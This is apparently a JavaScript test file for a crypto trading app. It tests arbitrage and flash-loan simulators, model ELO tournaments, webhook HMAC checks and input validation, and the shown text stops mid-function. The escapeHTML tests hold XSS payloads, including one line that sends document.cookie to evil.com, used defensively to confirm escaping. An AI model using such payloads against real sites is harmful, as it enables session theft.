#!/usr/bin/env node

/**
 * TRADE ARENA - Unit & Integration Tests
 * Run with: npm test
 */

const crypto = require("crypto");
const { TradingEngine } = require("./public/trading-engine.js");
const {
  SecurityHelper,
  ArbitrageAnalyzer,
  FlashLoanSimulator,
} = require("./public/contract-helpers.js");
const {
  CrucibleTest,
  runCrucibleTest,
  calculateRSI,
  calculateATR,
  calculateSMA,
  classifyRegime,
  validateAllRegimes,
} = require("./public/crucible-test.js");
const { TRADE_OLYMPICS } = require("./public/trade-olympics.js");
const {
  ARENA_COMPETITION,
  BOT_AI_MODELS,
  MODEL_SELECTION,
  callAIModel,
  getModelConfig,
} = require("./public/multi-ai-arena.js");
const { calculateSlippage } = require("./public/real-wallet.js");
const { CrucibleRealTrading } = require("./public/crucible-real-trading.js");
const {
  createRiskState,
  recordOpportunityResult,
  getRiskAdjustment,
} = require("./public/arb-risk-engine.js");
const {
  americanToProbability,
  removeVig,
  findSportsPredictionEdges,
} = require("./public/sports-odds-arb.js");
const {
  calculateFlashLoanArb,
  scanCrossDexFlashArb,
} = require("./public/cross-dex-arb-scanner.js");

const tests = [];
let currentSuite = "";
let testFailures = 0;

const expect = (value) => ({
  toBe: (expected) => {
    if (value !== expected)
      throw new Error(`Expected ${expected}, got ${value}`);
  },
  toEqual: (expected) => {
    if (JSON.stringify(value) !== JSON.stringify(expected)) {
      throw new Error(
        `Expected ${JSON.stringify(expected)}, got ${JSON.stringify(value)}`,
      );
    }
  },
  toBeGreaterThan: (expected) => {
    if (value <= expected)
      throw new Error(`Expected > ${expected}, got ${value}`);
  },
  toBeGreaterThanOrEqual: (expected) => {
    if (value < expected)
      throw new Error(`Expected >= ${expected}, got ${value}`);
  },
  toBeLessThan: (expected) => {
    if (value >= expected)
      throw new Error(`Expected < ${expected}, got ${value}`);
  },
  toBeLessThanOrEqual: (expected) => {
    if (value > expected)
      throw new Error(`Expected <= ${expected}, got ${value}`);
  },
  toContain: (expected) => {
    if (!value.includes(expected))
      throw new Error(`Expected ${value} to contain ${expected}`);
  },
  toMatch: (pattern) => {
    if (!pattern.test(value))
      throw new Error(`Expected ${value} to match ${pattern}`);
  },
});

const describe = (name, fn) => {
  currentSuite = name;
  fn();
};

const it = (name, fn) => {
  tests.push({ suite: currentSuite, name, fn });
};

describe("Trading Engine - Core Logic", () => {
  it("loads the real TradingEngine module", () => {
    const engine = new TradingEngine();
    expect(Array.isArray(engine.bots)).toBe(true);
    expect(engine.riskLimits.maxOpportunityAgeMs).toBe(45000);
  });

  it("filters stablecoins from market pairs", () => {
    const engine = new TradingEngine();
    const pairs = [
      { token: "WETH" },
      { token: "USDC" },
      { token: "ARB" },
      { token: "DAI" },
    ];
    expect(engine.filterStablecoins(pairs).map((pair) => pair.token)).toEqual([
      "WETH",
      "ARB",
    ]);
  });

  it("detects arbitrage opportunities with deterministic exchange prices", async () => {
    const engine = new TradingEngine();
    engine.fetchPrice = async (_token, exchange) =>
      exchange === "uniswap" ? 100 : 101;

    const opportunities = await engine.detectArbitrageOpportunities([
      { token: "WETH", volume: 100000, volatility: 2 },
      { token: "USDC", volume: 100000, volatility: 1 },
    ]);

    expect(opportunities.length).toBe(1);
    expect(opportunities[0].token).toBe("WETH");
    expect(opportunities[0].profitMargin).toBeGreaterThan(0.3);
  });

  it("calculates risk scores inside 0-100", () => {
    const engine = new TradingEngine();
    const risk = engine.calculateRiskScore(5, 0.5);
    expect(risk).toBeGreaterThanOrEqual(0);
    expect(risk).toBeLessThanOrEqual(100);
  });

  it("generates unique IDs", () => {
    const engine = new TradingEngine();
    expect(engine.generateId() === engine.generateId()).toBe(false);
  });
});

describe("Trading Engine - Volatility & Sizing", () => {
  it("calculates volatility from price history", () => {
    const engine = new TradingEngine();
    const analysis = engine.analyzeVolatility([
      2500, 2510, 2520, 2515, 2525, 2530,
    ]);
    expect(analysis.current !== undefined).toBe(true);
    expect(analysis.forecast1h !== undefined).toBe(true);
  });

  it("classifies low and high volatility", () => {
    const engine = new TradingEngine();
    expect(engine.analyzeVolatility([2500, 2501, 2502, 2503, 2504]).trend).toBe(
      "LOW",
    );
    expect(engine.analyzeVolatility([2500, 2700, 2300, 2800, 2200]).trend).toBe(
      "HIGH",
    );
  });

  it("reduces position size in high volatility", () => {
    const engine = new TradingEngine();
    const lowVol = engine.calculatePositionSize(10, 2, 10);
    const highVol = engine.calculatePositionSize(10, 8, 10);
    expect(parseFloat(lowVol.size)).toBeGreaterThan(parseFloat(highVol.size));
    expect(lowVol.riskReward).toBe(2.5);
  });
});

describe("Trading Engine - Signal & Execution", () => {
  it("generates buy signals for oversold conditions", () => {
    const engine = new TradingEngine();
    const signal = engine.generateTradeSignal({
      price: 2500,
      volume: 100000,
      rsi: 25,
      macd: { histogram: 0.5, prevHistogram: 0.4 },
      bollinger: { upper: 2600, lower: 2400, middle: 2500 },
    });
    expect(signal.action).toBe("BUY");
  });

  it("generates sell signals for overbought conditions", () => {
    const engine = new TradingEngine();
    const signal = engine.generateTradeSignal({
      price: 2500,
      volume: 100000,
      rsi: 85,
      macd: { histogram: -0.5, prevHistogram: -0.4 },
      bollinger: { upper: 2600, lower: 2400, middle: 2500 },
    });
    expect(signal.action).toBe("SELL");
  });

  it("records profitable paper trade execution", async () => {
    const engine = new TradingEngine();
    const bot = {
      id: engine.generateId(),
      name: "Test Bot",
      amount: 10,
      risk: "Moderate (5x leverage)",
    };
    const trade = await engine.executeTrade(bot, {
      type: "ARBITRAGE",
      profitMargin: 0.8,
      volatility: 2,
      buyPrice: 2500,
      sellPrice: 2525,
      timestamp: Date.now(),
      ttl: 45000,
    });

    expect(trade.botId).toBe(bot.id);
    expect(trade.status).toBe("CLOSED");
    expect(Number(trade.profit)).toBeGreaterThan(0);
  });

  it("expires stale opportunities before execution", async () => {
    const engine = new TradingEngine();
    const bot = {
      id: engine.generateId(),
      name: "Expiry Bot",
      amount: 10,
      risk: "Moderate (5x leverage)",
    };
    const trade = await engine.executeTrade(bot, {
      type: "ARBITRAGE",
      profitMargin: 1,
      volatility: 2,
      timestamp: Date.now() - 60000,
      ttl: 45000,
    });

    expect(trade.status).toBe("EXPIRED");
    expect(trade.profit).toBe(0);
  });
});

describe("Contract Helpers - Security & Simulation", () => {
  it("identifies stablecoins", () => {
    expect(SecurityHelper.isStablecoin("USDC")).toBe(true);
    expect(SecurityHelper.isStablecoin("USDT")).toBe(true);
    expect(SecurityHelper.isStablecoin("DAI")).toBe(true);
    expect(SecurityHelper.isStablecoin("ETH")).toBe(false);
  });

  it("assesses MEV risk and recommendations", () => {
    expect(
      SecurityHelper.analyzeMEVRisk({
        amountIn: 50,
        volatility: 8,
        liquidity: 50000,
      }).recommendation,
    ).toBe("WAIT");
    expect(
      SecurityHelper.analyzeMEVRisk({
        amountIn: 1,
        volatility: 2,
        liquidity: 5000000,
      }).recommendation,
    ).toBe("PROCEED");
  });

  it("estimates higher slippage for larger or lower-liquidity trades", () => {
    const small = SecurityHelper.estimateSlippage(1, 1000000, 3);
    const large = SecurityHelper.estimateSlippage(100, 1000000, 3);
    const lowLiq = SecurityHelper.estimateSlippage(10, 100000, 3);
    const highLiq = SecurityHelper.estimateSlippage(10, 10000000, 3);

    expect(large).toBeGreaterThan(small);
    expect(lowLiq).toBeGreaterThan(highLiq);
  });

  it("validates contract interaction inputs", () => {
    const valid = SecurityHelper.validateContractInteraction(
      "0x4200000000000000000000000000000000000006",
      "transfer",
      [],
    );
    const invalid = SecurityHelper.validateContractInteraction(
      "not-an-address",
      "transfer",
      [],
    );

    expect(valid.valid).toBe(true);
    expect(invalid.valid).toBe(false);
  });
});

describe("Arbitrage & Flash Loan Simulators", () => {
  it("identifies viable arbitrage after fees", () => {
    const profitable = ArbitrageAnalyzer.calculateArbitrage(
      2500,
      2700,
      10000,
      1,
    );
    const unprofitable = ArbitrageAnalyzer.calculateArbitrage(
      2500,
      2501,
      10000,
      1,
    );

    expect(profitable.isViable).toBe(true);
    expect(Number(unprofitable.netProfit)).toBeLessThan(0);
  });

  it("detects triangular arbitrage", () => {
    const arb = ArbitrageAnalyzer.findTriangularArbitrage({
      "ETH/USD": 2500,
      "USD/USDC": 1,
      "USDC/ETH": 0.000401,
    });
    expect(arb.opportunity).toBe(true);
  });

  it("calculates flash loan liquidation and sandwich metrics", () => {
    const liquidation = FlashLoanSimulator.simulateLiquidation(100, 50, 2500);
    const sandwich = FlashLoanSimulator.simulateSandwich(100, 50, 100);

    expect(liquidation.flashLoanFee).toBe((100 * 0.0009).toFixed(4));
    expect(Number(liquidation.profit)).toBeGreaterThan(0);
    expect(Number(sandwich.totalProfit)).toBeGreaterThan(0);
  });
});

describe("Crucible Regime Coverage", () => {
  it("calculates RSI, ATR, and SMA indicators", () => {
    const closes = [
      101, 103, 102, 104, 106, 105, 107, 109, 108, 110, 111, 109, 108, 107, 106,
    ];
    const highs = [
      102, 104, 103, 105, 107, 106, 108, 110, 109, 111, 112, 110, 109, 108, 107,
    ];
    const lows = [
      99, 101, 100, 102, 104, 103, 105, 107, 105, 108, 109, 107, 106, 105, 104,
    ];

    expect(calculateRSI(closes, 14)).toBeGreaterThanOrEqual(0);
    expect(calculateRSI(closes, 14)).toBeLessThanOrEqual(100);
    expect(calculateATR(highs, lows, closes, 14)).toBeGreaterThan(0);
    expect(calculateSMA(closes, 5)).toBe(108.2);
  });

  it("classifies every required market regime", () => {
    expect(classifyRegime(65, 2, 110, 105)).toBe("BULL");
    expect(classifyRegime(35, 2, 100, 105)).toBe("BEAR");
    expect(classifyRegime(50, 6, 105, 105)).toBe("HIGH_VOL");
    expect(classifyRegime(50, 2, 105, 105)).toBe("CHOP");
  });

  it("passes the all-regime Crucible coverage validator", () => {
    const coverage = validateAllRegimes();
    expect(coverage.passed).toBe(true);
    expect(coverage.regimes.sort()).toEqual(
      ["BEAR", "BULL", "CHOP", "HIGH_VOL"].sort(),
    );
  });

  it("runs a fast Crucible paper test with strict risk accounting", async () => {
    CrucibleTest.config.verbose = false;
    CrucibleTest.config.verifyResults = true;
    await runCrucibleTest(2, 0);

    expect(CrucibleTest.trades.length).toBe(2);
    CrucibleTest.trades.forEach((trade) => {
      expect(trade.verified).toBe(true);
      expect([30, -10, 0]).toContain(trade.pnl);
    });
  });
});

describe("Self-Evolving ELO Tournament System", () => {
  const tournamentModels = [
    { name: "ALPHA", provider: "test", elo: 1200 },
    { name: "BETA", provider: "test", elo: 1200 },
    { name: "GAMMA", provider: "test", elo: 1200 },
  ];

  it("initializes brackets and normalized global weights", () => {
    const summary = TRADE_OLYMPICS.reset({
      models: tournamentModels,
      persist: false,
      silent: true,
    });

    expect(summary.totalModels).toBe(3);
    expect(summary.totalBrackets).toBe(
      TRADE_OLYMPICS.METHODS.length *
        TRADE_OLYMPICS.TOKENS.length *
        TRADE_OLYMPICS.EDGE_TIERS.length,
    );

    const assignment = TRADE_OLYMPICS.getModelForTrade("ARBITRAGE", "BTC", 2);
    expect(assignment.isOlympics).toBe(true);
    expect(["ALPHA", "BETA", "GAMMA"].includes(assignment.model)).toBe(true);

    const weights = TRADE_OLYMPICS.getGlobalWeights();
    const totalWeight = weights.reduce((sum, item) => sum + item.weight, 0);

    expect(weights.length).toBe(3);
    expect(totalWeight).toBeGreaterThan(0.999);
    expect(totalWeight).toBeLessThan(1.001);
  });

  it("evolves ELO standings and global weights after tournaments", () => {
    TRADE_OLYMPICS.reset({
      models: tournamentModels,
      persist: false,
      silent: true,
    });

    const tournament = TRADE_OLYMPICS.runEloTournament({
      rounds: 2,
      random: () => 0.9,
    });
    const leaderboard = TRADE_OLYMPICS.getEloLeaderboard();
    const weights = TRADE_OLYMPICS.getGlobalWeights();

    expect(tournament.matches.length).toBe(6);
    expect(TRADE_OLYMPICS.MATCH_LOG.length).toBe(6);
    expect(leaderboard[0].elo).toBeGreaterThan(1200);
    expect(weights[0].model).toBe(leaderboard[0].model);
    expect(weights[0].weight).toBeGreaterThan(
      weights[weights.length - 1].weight,
    );
  });

  it("records trade matchups into bracket stats and ELO ratings", () => {
    TRADE_OLYMPICS.reset({
      models: tournamentModels.slice(0, 2),
      persist: false,
      silent: true,
    });

    const assignment = TRADE_OLYMPICS.getModelForTrade("SPOT LONG", "ETH", 2);
    const opponent = assignment.model === "ALPHA" ? "BETA" : "ALPHA";
    const beforeElo = TRADE_OLYMPICS.STANDINGS[assignment.model].elo;
    const entry = TRADE_OLYMPICS.recordTrade(assignment.bracket, {
      outcome: "WIN",
      pnl: 25,
      edge: 2,
      model: assignment.model,
      opponentModel: opponent,
      opponentPnl: -10,
    });

    expect(entry.outcome).toBe("WIN");
    expect(TRADE_OLYMPICS.BRACKETS[assignment.bracket].trades).toBe(1);
    expect(TRADE_OLYMPICS.BRACKETS[assignment.bracket].wins).toBe(1);
    expect(TRADE_OLYMPICS.STANDINGS[assignment.model].totalTrades).toBe(1);
    expect(TRADE_OLYMPICS.STANDINGS[assignment.model].elo).toBeGreaterThan(
      beforeElo,
    );
  });
});

describe("Multi-AI Arena Global Weights", () => {
  it("loads ELO model metadata for weighted model selection", () => {
    expect(getModelConfig("gpt-5-turbo").elo).toBe(1400);
    expect(getModelConfig("qwen-72b").elo).toBe(1090);

    const originalRandom = Math.random;
    Math.random = () => 0;
    try {
      expect(MODEL_SELECTION.eloWeighted()).toBe("gpt-5-turbo");
    } finally {
      Math.random = originalRandom;
    }
  });

  it("records model outcomes into arena competition stats", async () => {
    ARENA_COMPETITION.modelStats = {};
    Object.keys(BOT_AI_MODELS).forEach((botId) => delete BOT_AI_MODELS[botId]);

    const originalRandom = Math.random;
    Math.random = () => 0.01;
    try {
      const decision = await callAIModel(
        [
          {
            symbol: "ETH",
            current_price: 2500,
            price_change_percentage_24h: 1,
            total_volume: 1000000000,
          },
        ],
        100,
        42,
      );

      const stats = ARENA_COMPETITION.modelStats[decision.aiModel];
      expect(stats.baseTrades).toBe(1);
      expect(stats.wins).toBe(1);
      expect(stats.eloRating).toBe(getModelConfig(decision.aiModel).elo);
    } finally {
      Math.random = originalRandom;
    }
  });
});

describe("Live-Data Trade Logic Safety & Self-Correction", () => {
  it("resets real-trading session state before each run", async () => {
    await CrucibleRealTrading.init({ startingBalance: 75, enableAILearning: true });
    CrucibleRealTrading.tradeState.wins = 99;
    CrucibleRealTrading.aiState.riskMultiplier = 0.5;
    CrucibleRealTrading.aiState.adjustments.push({ reason: "test" });

    await CrucibleRealTrading.init({ startingBalance: 50, enableAILearning: true });

    expect(CrucibleRealTrading.tradeState.currentBalance).toBe(50);
    expect(CrucibleRealTrading.tradeState.wins).toBe(0);
    expect(CrucibleRealTrading.tradeState.losses).toBe(0);
    expect(CrucibleRealTrading.aiState.riskMultiplier).toBe(1);
    expect(CrucibleRealTrading.aiState.adjustments.length).toBe(0);
  });

  it("tracks bad trades and self-corrects risk exposure", async () => {
    await CrucibleRealTrading.init({ startingBalance: 50, enableAILearning: true });

    const crypto = { symbol: "ETH" };
    const indicators = {
      currentPrice: 2500,
      volatility: 2,
      rsi: 72,
      momentum: -1.2,
      trendStrength: -2,
    };
    const signals = {
      strategy: "MOMENTUM_SHORT",
      direction: "SHORT",
      confidence: 80,
    };

    const originalRandom = Math.random;
    Math.random = () => 0.99; // force stop-loss path
    try {
      for (let i = 0; i < 4; i++) {
        const size = CrucibleRealTrading.calculatePositionSize(indicators, signals);
        await CrucibleRealTrading.executeTrade(crypto, indicators, signals, size);
      }
    } finally {
      Math.random = originalRandom;
    }

    const perf = CrucibleRealTrading.aiState.strategyPerformance.MOMENTUM_SHORT;
    expect(perf.losses).toBe(4);
    expect(perf.consecutiveLosses).toBe(4);
    expect(CrucibleRealTrading.aiState.entryAdaptation).toBeLessThan(1);
    expect(CrucibleRealTrading.aiState.riskMultiplier).toBeLessThan(1);
    expect(CrucibleRealTrading.aiState.adjustments.length).toBeGreaterThan(0);
    expect(CrucibleRealTrading.aiState.adjustments.at(-1).reason).toBe(
      "underperforming_strategy",
    );
  });

  it("keeps drawdown-based position sizing non-negative", async () => {
    await CrucibleRealTrading.init({ startingBalance: 50, enableAILearning: true });
    CrucibleRealTrading.tradeState.maxDrawdownPercent = 40;

    const size = CrucibleRealTrading.calculatePositionSize(
      { volatility: 6 },
      { confidence: 80 },
    );

    expect(size).toBeGreaterThanOrEqual(0);
    expect(size).toBeLessThanOrEqual(CrucibleRealTrading.tradeState.equity * 0.5);
  });

  it("caps live wallet slippage estimates before any order is sent", () => {
    const slippage = calculateSlippage(1000, 25, "PERP SHORT");

    expect(Number(slippage.percent)).toBeLessThanOrEqual(2);
    expect(slippage.method).toBe("PERP SHORT");
  });
});

describe("Cross-Market Arbitrage Dry Run Scanners", () => {
  it("converts odds, removes vig, and finds sports prediction-market edge", () => {
    expect(Number(americanToProbability(-150).toFixed(4))).toBe(0.6);

    const fair = removeVig([
      { name: "Team A", price: -150 },
      { name: "Team B", price: 130 },
    ]);
    const fairTotal = fair.reduce((sum, outcome) => sum + outcome.fairProbability, 0);
    expect(fairTotal).toBeGreaterThan(0.999);
    expect(fairTotal).toBeLessThan(1.001);

    const riskState = createRiskState({ minNetEdge: 0.03, minNetProfitUSD: 1 });
    const opportunities = findSportsPredictionEdges({
      riskState,
      sportsbookEvents: [
        {
          id: "game-1",
          sport_key: "basketball_nba",
          home_team: "Team A",
          away_team: "Team B",
          bookmakers: [
            {
              key: "sharp",
              markets: [
                {
                  key: "h2h",
                  outcomes: [
                    { name: "Team A", price: -160 },
                    { name: "Team B", price: 140 },
                  ],
                },
              ],
            },
          ],
        },
      ],
      predictionMarkets: [
        {
          eventId: "game-1",
          outcome: "Team A",
          yesPrice: 0.54,
          noPrice: 0.47,
          liquidityUSD: 5000,
        },
      ],
      config: { minNetEdge: 0.03, minLiquidityUSD: 1000, maxSizeUSD: 100 },
    });

    expect(opportunities.length).toBe(1);
    expect(opportunities[0].side).toBe("YES");
    expect(opportunities[0].status).toBe("CANDIDATE");
    expect(opportunities[0].netEdge).toBeGreaterThan(0.03);
    expect(opportunities[0].executionMode).toBe("PREFUNDED_USDC");
  });

  it("calculates viable cross-DEX flash-loan arbitrage after all costs", async () => {
    const economics = calculateFlashLoanArb({
      borrowAmountUSD: 10000,
      buyQuote: { amountOut: 5, slippageUSD: 1 },
      sellQuote: { amountOut: 10045, slippageUSD: 1 },
      config: { gasUSD: 3, mevBufferUSD: 2, minNetProfitUSD: 10, minROI: 0.0015 },
    });

    expect(economics.netProfitUSD).toBeGreaterThan(10);
    expect(economics.isViable).toBe(true);

    const quoteProvider = async ({ dex, side, amountIn }) => {
      if (side === "buy") {
        return {
          dex,
          amountOut: amountIn / 2000,
          slippageUSD: 1,
          liquidityUSD: 250000,
          timestamp: 1000,
        };
      }
      return {
        dex,
        amountOut: amountIn * 2009,
        slippageUSD: 1,
        liquidityUSD: 250000,
        timestamp: 1000,
      };
    };

    const opportunities = await scanCrossDexFlashArb({
      quoteProvider,
      tokens: [{ symbol: "USDC" }, { symbol: "WETH" }],
      dexes: ["Uniswap", "Aerodrome"],
      borrowAmountsUSD: [10000],
      riskState: createRiskState({ minNetProfitUSD: 10, minNetEdge: 0.0015, maxTradeSizeUSD: 20000 }),
      config: { gasUSD: 3, mevBufferUSD: 2, minNetProfitUSD: 10, minROI: 0.0015 },
      now: 1000,
    });

    expect(opportunities.length).toBeGreaterThan(0);
    expect(opportunities[0].status).toBe("CANDIDATE");
    expect(opportunities[0].dryRunOnly).toBe(true);
    expect(opportunities[0].executionMode).toBe("FLASH_LOAN");
  });

  it("self-corrects and cools down arbitrage strategies after losses", () => {
    const now = Date.now();
    const riskState = createRiskState({ cooldownMs: 60000 });

    recordOpportunityResult(
      riskState,
      {
        strategy: "CROSS_DEX_FLASH_LOAN_ARB",
        netPnlUSD: -12,
        estimatedSlippageUSD: 1,
        actualSlippageUSD: 2,
      },
      now,
    );
    recordOpportunityResult(
      riskState,
      { strategy: "CROSS_DEX_FLASH_LOAN_ARB", netPnlUSD: -8 },
      now + 1,
    );

    const adjustment = getRiskAdjustment(riskState, "CROSS_DEX_FLASH_LOAN_ARB", now + 2);
    expect(adjustment.blocked).toBe(true);
    expect(adjustment.reasons).toContain("strategy_cooldown");
    expect(adjustment.riskMultiplier).toBeLessThan(1);
    expect(adjustment.minEdgeBump).toBeGreaterThan(0);
  });
});

describe("Payout Service - Robustness & Security", () => {
  const PayoutService = require('./services/payouts/payoutService');

  it("handles missing private key gracefully", () => {
    const service = new PayoutService({
      rewardTokenAddress: "0x123",
      payoutManagerAddress: "0x456",
      chainId: 8453
    });
    expect(service.oracleWallet).toBe(null);
  });

  it("throws clear error when signing without wallet", async () => {
    const service = new PayoutService({});
    try {
      await service.generatePayoutSignature("0xabc", "task-1", 100, 123);
      throw new Error("Should have thrown");
    } catch (e) {
      expect(e.message).toBe("Oracle wallet not configured");
    }
  });

  it("initializes wallet correctly when key provided", () => {
    const wallet = require("ethers").Wallet.createRandom();
    const service = new PayoutService({ oraclePrivateKey: wallet.privateKey });
    expect(service.oracleWallet !== null).toBe(true);
    expect(service.oracleWallet.address).toBe(wallet.address);
  });
});

describe("MoonPay Webhook - Security Verification", () => {
  const verifyMoonPaySignature = (body, signature, secret) => {
    try {
      const hmac = crypto.createHmac('sha256', secret);
      const digest = hmac.update(JSON.stringify(body)).digest('hex');
      const digestBuffer = Buffer.from(digest);
      const signatureBuffer = Buffer.from(signature);
      if (digestBuffer.length !== signatureBuffer.length) return false;
      return crypto.timingSafeEqual(digestBuffer, signatureBuffer);
    } catch (e) {
      return false;
    }
  };

  const secret = "test-secret-123";
  const payload = { id: "trans_123", status: "completed", amount: 50 };
  const validSignature = crypto.createHmac('sha256', secret).update(JSON.stringify(payload)).digest('hex');

  it("validates a correct HMAC-SHA256 signature", () => {
    const isValid = verifyMoonPaySignature(payload, validSignature, secret);
    expect(isValid).toBe(true);
  });

  it("rejects an incorrect signature", () => {
    const isInvalid = verifyMoonPaySignature(payload, "wrong-signature", secret);
    expect(isInvalid).toBe(false);
  });

  it("rejects a correct signature with the wrong secret", () => {
    const isInvalid = verifyMoonPaySignature(payload, validSignature, "wrong-secret");
    expect(isInvalid).toBe(false);
  });

  it("prevents timing attacks using timingSafeEqual (logical check)", () => {
    // This is more of a logic check that we are using the right function
    // timingSafeEqual throws if lengths differ, which we handle
    const shortSignature = "abc";
    const isInvalid = verifyMoonPaySignature(payload, shortSignature, secret);
    expect(isInvalid).toBe(false);
  });
});

describe("Performance", () => {
  it("generates IDs and computes indicators quickly", () => {
    const engine = new TradingEngine();
    const prices = Array(500)
      .fill(2500)
      .map((price, index) => price + Math.sin(index) * 50);
    const start = Date.now();

    for (let i = 0; i < 1000; i++) engine.generateId();
    engine.analyzeVolatility(prices);
    for (let i = 0; i < 100; i++) engine.calculatePositionSize(10, 3, 5);

    expect(Date.now() - start).toBeLessThan(150);
  });

  it("calculates volatility with single-pass algorithm correctly", () => {
    const engine = new TradingEngine();
    // Use simple prices to make manual verification easy
    // Returns: (2-1)/1 = 1, (3-2)/2 = 0.5
    // Mean = (1 + 0.5) / 2 = 0.75
    // Var = ((1^2 + 0.5^2) / 2) - 0.75^2 = (1.25 / 2) - 0.5625 = 0.625 - 0.5625 = 0.0625
    // Vol = sqrt(0.0625) * 100 = 0.25 * 100 = 25%
    const prices = [1, 2, 3];
    const analysis = engine.analyzeVolatility(prices);

    expect(parseFloat(analysis.current)).toBe(25.00);
  });
});

// ─────────────────────────────────────────────────────────
// escapeHTML is defined inside index.html as a browser script
// and is not a Node module, so we replicate the implementation
// here to enable unit-testing without a browser environment.
// Keep this definition in sync with index.html:1304-1312.
// ─────────────────────────────────────────────────────────
const escapeHTML = (str) => {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

describe("escapeHTML - XSS Prevention (index.html:1304)", () => {
  // ── Falsy / edge input ──────────────────────────────────
  it("returns empty string for null", () => {
    expect(escapeHTML(null)).toBe('');
  });

  it("returns empty string for undefined", () => {
    expect(escapeHTML(undefined)).toBe('');
  });

  it("returns empty string for empty string", () => {
    expect(escapeHTML('')).toBe('');
  });

  it("returns empty string for 0 (falsy number)", () => {
    expect(escapeHTML(0)).toBe('');
  });

  it("returns empty string for false", () => {
    expect(escapeHTML(false)).toBe('');
  });

  // ── Plain / safe input passes through unchanged ─────────
  it("passes plain ASCII text through unchanged", () => {
    expect(escapeHTML('BULL')).toBe('BULL');
  });

  it("passes alphanumeric mode string through unchanged", () => {
    expect(escapeHTML('HIGH_VOL')).toBe('HIGH_VOL');
  });

  // ── Individual character escaping ───────────────────────
  it("escapes & to &amp;", () => {
    expect(escapeHTML('AT&T')).toBe('AT&amp;T');
  });

  it("escapes < to &lt;", () => {
    expect(escapeHTML('a<b')).toBe('a&lt;b');
  });

  it("escapes > to &gt;", () => {
    expect(escapeHTML('a>b')).toBe('a&gt;b');
  });

  it("escapes \" to &quot;", () => {
    expect(escapeHTML('say "hi"')).toBe('say &quot;hi&quot;');
  });

  it("escapes ' to &#039;", () => {
    expect(escapeHTML("it's")).toBe('it&#039;s');
  });

  // ── XSS payloads ────────────────────────────────────────
  it("escapes a basic <script> XSS payload", () => {
    const payload = '<script>alert(1)</script>';
    const result = escapeHTML(payload);
    expect(result).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
  });

  it("does not contain a raw < after escaping a script tag", () => {
    const result = escapeHTML('<script>alert("xss")</script>');
    expect(result.includes('<')).toBe(false);
  });

  it("escapes attribute-injection payload with double quotes", () => {
    const payload = '" onmouseover="alert(1)';
    const result = escapeHTML(payload);
    expect(result).toBe('&quot; onmouseover=&quot;alert(1)');
  });

  it("escapes attribute-injection payload with single quotes", () => {
    const payload = "' onload='alert(1)";
    const result = escapeHTML(payload);
    expect(result).toBe('&#039; onload=&#039;alert(1)');
  });

  it("escapes img onerror XSS payload", () => {
    const payload = '<img src=x onerror=alert(1)>';
    const result = escapeHTML(payload);
    expect(result).toBe('&lt;img src=x onerror=alert(1)&gt;');
  });

  it("escapes a payload with all five special characters", () => {
    const payload = '<a href="test" onclick=\'alert(1 & 2)\'>';
    const result = escapeHTML(payload);
    expect(result).toBe('&lt;a href=&quot;test&quot; onclick=&#039;alert(1 &amp; 2)&#039;&gt;');
  });

  // ── Non-string input coercion ────────────────────────────
  it("converts a truthy number to its string representation", () => {
    expect(escapeHTML(42)).toBe('42');
  });

  it("converts an object with toString to a string", () => {
    const obj = { toString: () => '<BULL>' };
    expect(escapeHTML(obj)).toBe('&lt;BULL&gt;');
  });

  // ── Regression: results.mode field from showCrucibleResults ──
  it("REGRESSION: results.mode with XSS payload is safe for innerHTML", () => {
    // Simulates the exact scenario fixed by the PR: a user-influenced
    // results.mode reaching the Crucible modal innerHTML template.
    const maliciousMode = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
    const escaped = escapeHTML(maliciousMode);
    // Must not contain any raw angle brackets that would be parsed as tags
    expect(escaped.includes('<')).toBe(false);
    expect(escaped.includes('>')).toBe(false);
    expect(escaped).toContain('&lt;script&gt;');
  });

  it("REGRESSION: benign mode strings are preserved exactly after escaping", () => {
    // Verifies that the fix does not corrupt legitimate mode values
    // such as those returned by simulateCrucibleV2Results.
    const modes = ['BULL', 'BEAR', 'CHOP', 'HIGH_VOL', 'STRESS_1_5X'];
    for (const mode of modes) {
      expect(escapeHTML(mode)).toBe(mode);
    }
  });
});

describe("Server Input Validation - Sentinel Hardening", () => {
  it("validates Ethereum addresses correctly using ethers.isAddress", () => {
    const { ethers } = require("ethers");
    expect(ethers.isAddress("0x9F407b7f793555c35c33aC64bd6901759470736D")).toBe(true);
    expect(ethers.isAddress("invalid-address")).toBe(false);
    expect(ethers.isAddress("")).toBe(false);
  });

  it("checks numeric validation logic used for reward", () => {
    const isValidReward = (reward) => {
      return typeof reward === 'number' && !isNaN(reward) && isFinite(reward) && reward > 0 && reward <= 100;
    };
    expect(isValidReward(10)).toBe(true);
    expect(isValidReward(-5)).toBe(false);
    expect(isValidReward(NaN)).toBe(false);
    expect(isValidReward(Infinity)).toBe(false);
    expect(isValidReward(101)).toBe(false);
    expect(isValidReward("10")).toBe(false);
  });

  it("validates taskId format and length correctly", () => {
    const isValidTaskId = (taskId) => {
      return !!(taskId && typeof taskId === 'string' && taskId.length <= 100);
    };
    expect(isValidTaskId("task-123")).toBe(true);
    expect(isValidTaskId("")).toBe(false);
    expect(isValidTaskId(null)).toBe(false);
    expect(isValidTaskId(123)).toBe(false);
    expect(isValidTaskId("a".repeat(101))).toBe(false);
  });

  it("validates proofOfWork format and length correctly", () => {
    const isValidProofOfWork = (proofOfWork) => {
      return !!(proofOfWork && typeof proofOfWork === 'string' && proofOfWork.length <= 1000);
    };
    expect(isValidProofOfWork("proof-data")).toBe(true);
    expect(isValidProofOfWork("")).toBe(false);
    expect(isValidProofOfWork(null)).toBe(false);
    expect(isValidProofOfWork({})).toBe(false);
    expect(isValidProofOfWork("a".repeat(1001))).toBe(false);
  });

  it("validates user login input types, formats, and lengths correctly", () => {
    const validateLoginInput = (email, address, name, provider, avatar) => {
      const userId = email || address;
      if (!userId || typeof userId !== 'string' || userId.length > 100) return false;
      const dangerousProps = ['__proto__', 'constructor', 'prototype'];
      if (dangerousProps.includes(userId) || (email && dangerousProps.includes(email)) || (address && dangerousProps.includes(address))) return false;
      if (email && (typeof email !== 'string' || email.length > 100 || !email.includes('@'))) return false;
      if (address && (typeof address !== 'string' || address.length > 100 || !require("ethers").isAddress(address))) return false;
      if (name && (typeof name !== 'string' || name.length > 100)) return false;
      if (provider && (typeof provider !== 'string' || provider.length > 50)) return false;
      if (avatar && (typeof avatar !== 'string' || avatar.length > 500)) return false;
